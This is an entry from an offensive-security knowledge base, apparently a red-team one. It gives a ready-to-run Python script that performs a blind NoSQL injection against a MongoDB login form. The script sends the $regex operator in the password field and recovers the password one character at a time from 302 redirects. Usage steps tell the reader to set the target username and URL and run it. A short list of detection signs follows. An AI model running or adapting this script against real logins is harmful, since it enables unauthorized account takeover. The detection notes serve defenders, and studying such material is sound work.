---
id: 2ed51100-df21-4d6f-9015-e5f0218e5113
name: Python-Script-for-MongoDB-Password-Brute-Force-via-Regex
type: code
language: Python
verified: true
created_at: '2023-04-06T03:56:31.536938+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
  - macOS
  - Windows
tags:
  - brute-force
  - nosql-injection
  - mongodb
  - regex-payload
validated: true
---

# Python-Script-for-MongoDB-Password-Brute-Force-via-Regex

## Code

```python
import requests
import urllib3
import string
import urllib
urllib3.disable_warnings()

username="admin"
password=""
u="http://example.org/login"
headers={'content-type': 'application/x-www-form-urlencoded'}

while True:
    for c in string.printable:
        if c not in ['*','+','.','?','|','&','$']:
            payload='user=%s&pass[$regex]=^%s&remember=on' % (username, password + c)
            r = requests.post(u, data = payload, headers = headers, verify = False, allow_redirects = False)
            if r.status_code == 302 and r.headers['Location'] == '/dashboard':
                print("Found one more char : %s" % (password+c))
                password += c
```

## Description

This Python script performs a blind brute force attack on a MongoDB login by injecting the $regex operator into the password field of a URL-encoded POST request. It starts with an empty password prefix and iteratively tests printable characters to build the password one character at a time. A match is confirmed if the server responds with a 302 redirect to the dashboard, indicating a valid prefix. The script disables SSL warnings, uses a simple header for form data, and avoids certain special characters that could break the regex. It is intended for use against vulnerable web applications where the authentication query can be manipulated via NoSQL injection.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| `username` | The target username to brute force (hardcoded; edit before running) | "admin" |
| `password` | Accumulator for the discovered password prefix (starts empty; do not edit) | "" (initial) |
| `u` | The URL of the login endpoint (hardcoded; edit before running) | "http://target.com/login" |
| `headers` | HTTP headers for the POST request (fixed for URL-encoded body) | {'content-type': 'application/x-www-form-urlencoded'} |

## Usage

1. Edit the `username` and `u` variables in the script to match the target.
2. Save as `brute_mongo.py`.
3. Run with `python brute_mongo.py` in a terminal.
4. Monitor console for "Found one more char" messages as the password builds.
This code is typically used in red team engagements after identifying a NoSQLi vulnerability in a login form. It can be delivered via a local Python environment or adapted for tools like Burp Suite Intruder for more control.

## Detection

- Network monitoring for repeated POST requests to /login with payloads containing [$regex] or ^ anchors from a single IP.
- Application logs showing failed logins with unusual query patterns (e.g., regex in password field).
- WAF alerts for NoSQL injection signatures or high request volumes to auth endpoints.
- Endpoint protection detecting Python processes making rapid HTTP requests to internal/external URLs.

## Related

- [[procedures/Brute-Force-MongoDB-Login-via-NoSQL-Regex-Injection]]
- [[run-python-mongodb-brute-force-script]]
